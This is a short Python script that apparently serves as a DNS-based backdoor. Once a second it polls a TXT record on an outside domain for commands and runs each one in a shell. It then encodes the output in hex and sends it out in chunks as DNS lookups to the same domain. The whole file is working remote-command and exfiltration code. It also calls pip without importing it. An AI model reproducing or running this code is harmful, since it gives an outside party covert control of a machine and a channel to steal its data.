import time
import subprocess
pip.main(['install', '-q', '--disable-pip-version-check', "dnspython"])
import dns.resolver
b = ".noservicetest.rhynorater.com"
while True:
    time.sleep(1)
    i = str(dns.resolver.query("checkin"+b,"TXT").response.answer[0][0]).split('"')[1]
    if i != "wait":
        r = i.split(":")[0]
        o = subprocess.getoutput(":".join(i.split(":")[1:]))
        j=1
        while len(o) !=0:
            h = r+str(j+1)+":"
            n = min(int((62-len(h))/2)-4, len(o))
            print(h+o[:n])
            print(len(h+o[:n]))
            dns.resolver.query((h+o[:n]).encode().hex()+b,"A")
            o=o[n:]
            j+=1
        dns.resolver.query((r+"0:").encode().hex()+b,"A")
